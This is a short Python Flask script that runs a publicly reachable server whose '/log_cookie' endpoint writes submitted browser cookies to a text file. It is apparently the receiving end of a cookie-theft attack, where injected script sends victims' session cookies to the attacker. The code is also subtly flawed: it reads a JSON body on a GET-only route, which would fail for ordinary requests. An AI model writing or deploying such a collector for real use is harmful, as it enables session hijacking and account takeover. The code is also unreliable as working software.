from flask import Flask, request

app = Flask(__name__)

@app.route('/log_cookie', methods=['GET'])
def log_cookie():
    data = request.json
    cookies = data.get('cookies', '')

    with open('logged_cookies.txt', 'a') as log_file:
        log_file.write(str(cookies) + '\n')

    return 'Cookies have been logged!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
